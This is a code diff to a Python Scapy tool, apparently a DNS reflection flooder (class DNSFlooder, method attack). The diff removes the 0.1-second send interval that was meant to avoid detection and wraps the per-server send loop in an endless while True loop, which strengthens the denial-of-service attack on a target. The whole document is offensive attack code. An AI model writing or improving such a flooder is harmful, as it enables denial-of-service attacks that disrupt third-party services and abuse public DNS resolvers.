@@ -1,4 +1,5 @@
 import threading
+import time
 from typing import List
 from scapy.volatile import RandShort
 from scapy.sendrecv import send
@@ -46,8 +47,8 @@ class DNSFlooder:
 )
         )
 
-        # inter 0.1 s so we won't be blocked by the DNS server
-        send(packet, loop=1, verbose=False, inter=0.1, realtime=False)
+        send(packet, verbose=False, realtime=False)
+        # send(packet, loop=1, verbose=False, inter=0.1, realtime=False)
 
     def attack(self, target: str, batch_size: int = 500):
         """
@@ -91,8 +92,11 @@ class DNSFlooder:
         thread_name = threading.current_thread().name
         print(f"{thread_name} processing {len(dns_batch)} DNS servers")
         
-        for dns in dns_batch:
-            try:
-                self.send_packet(target, dns)
-            except Exception as e:
-                print(f"Error processing DNS {dns}: {e}")
+        while True:
+            for dns in dns_batch:
+                try:
+                    self.send_packet(target, dns)
+                except Exception as e:
+                    print(f"Error processing DNS {dns}: {e}")
+
+            time.sleep(0.1)
